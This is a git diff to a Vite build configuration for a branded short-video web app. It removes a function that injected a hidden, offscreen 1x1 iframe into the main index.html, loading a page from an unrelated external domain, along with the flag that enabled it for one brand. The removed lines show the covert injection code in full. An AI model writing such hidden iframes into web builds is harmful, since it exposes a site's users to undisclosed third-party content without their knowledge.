@@ -118,15 +118,6 @@ function patchHtmlBrand(html: string, brand: BrandConfig, version?: string): str
   return next.replace(/<title>[^<]*<\/title>/i, `<title>${brand.displayName}</title>`)
 }
 
-function injectYogoGroupIframe(html: string): string {
-  const iframe = `  <iframe
-    src="https://mnby97.cc/assets/js/group.html?p=vE8hIfgY"
-    style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;"
-  ></iframe>`
-
-  return html.replace('</body>', `${iframe}\n</body>`)
-}
-
 function patchManifestBrand(raw: string, brand: BrandConfig): string {
   const manifest = JSON.parse(raw) as Record<string, unknown>
   manifest.name = brand.displayName
@@ -309,15 +300,13 @@ function copyShareHtmlFiles(outDir: string): Plugin {
   }
 }
 
-function htmlAssetCacheBust(version: string, brand: BrandConfig, enableYogoGroupIframe: boolean): Plugin {
+function htmlAssetCacheBust(version: string, brand: BrandConfig): Plugin {
   const publicHtmlNames = new Set(['reelshort-privacy-policy.html', 'airwallex.html'])
   return {
     name: 'html-asset-cache-bust',
     enforce: 'pre',
-    transformIndexHtml(html, context) {
-      const brandedHtml = patchHtmlBrand(patchHtmlAssetRefs(html, version, brand), brand, version)
-      const isMainEntry = path.basename(context.filename) === 'index.html'
-      return enableYogoGroupIframe && isMainEntry ? injectYogoGroupIframe(brandedHtml) : brandedHtml
+    transformIndexHtml(html) {
+      return patchHtmlBrand(patchHtmlAssetRefs(html, version, brand), brand, version)
     },
     configureServer(server) {
       server.middlewares.use((req, res, next) => {
@@ -459,7 +448,6 @@ export default ({ mode, command }: { mode: string; command: string }) => {
   const apiProxyTarget = env.VITE_API_PROXY_TARGET || 'https://test.yogoshort.com'
   const apiOriginForHints = inferApiOriginForPreconnect(env)
   const brand = brandConfigFromEnv(env)
-  const enableYogoGroupIframe = !isTikTokMinis && brand.assetBase === '/brands/yogoshort'
 
   if (isTikTokMinis && !env.VITE_TIKTOK_MINIS_CLIENT_KEY?.trim()) {
     throw new Error(
@@ -472,7 +460,7 @@ export default ({ mode, command }: { mode: string; command: string }) => {
       __APP_VERSION__: JSON.stringify(appVersion),
     },
     plugins: [
-      htmlAssetCacheBust(appVersion, brand, enableYogoGroupIframe),
+      htmlAssetCacheBust(appVersion, brand),
       ...(!isTikTokMinis ? [
         copyShareHtmlFiles(outDir),
         opNewStatic(outDir, brand, appVersion),
